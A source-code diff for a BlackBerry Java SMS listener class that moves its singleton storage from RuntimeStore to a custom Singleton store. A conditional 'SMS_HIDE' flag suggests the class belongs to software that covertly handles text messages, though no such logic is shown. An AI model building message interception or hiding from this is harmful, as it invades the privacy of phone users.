@@ -21,13 +21,16 @@ import blackberry.debug.DebugLevel;
 import blackberry.fs.Path;
 
 import blackberry.interfaces.SmsObserver;
+import blackberry.interfaces.iSingleton;
 import blackberry.debug.Check;
 import blackberry.utils.Utils;
 
+import blackberry.Singleton;
+
 //#ifdef SMS_HIDE
-public class SmsListener46 extends SmsListener implements SendListener {
+public class SmsListener46 extends SmsListener implements SendListener , iSingleton{
 //#else
-public class SmsListener46 extends SmsListener {  
+public class SmsListener46 extends SmsListener  implements iSingleton {  
 //#endif
     private static final long GUID = 0xe78b740082783263L;
     // Statics ------------------------------------------------------------------
@@ -66,10 +69,10 @@ public class SmsListener46 extends SmsListener {
     public synchronized static SmsListener46 getInstance() {
 
         if (instance == null) {
-            instance = (SmsListener46) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (SmsListener46) Singleton.self().get(GUID);
             if (instance == null) {
                 final SmsListener46 singleton = new SmsListener46();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
         }
